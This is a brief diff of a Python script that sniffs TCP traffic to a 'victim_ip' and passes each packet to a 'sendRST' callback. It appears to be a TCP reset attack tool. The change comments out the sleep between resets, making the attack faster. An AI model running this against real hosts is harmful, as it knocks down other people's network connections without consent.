@@ -48,7 +48,7 @@ def sendRST(pkt):
     print()    
     print()
 
-    time.sleep(randint(1, 2))
+    # time.sleep(randint(1, 2))
 
 pkt = sniff(filter="tcp and dst host " + victim_ip, prn=sendRST, store=0)
 
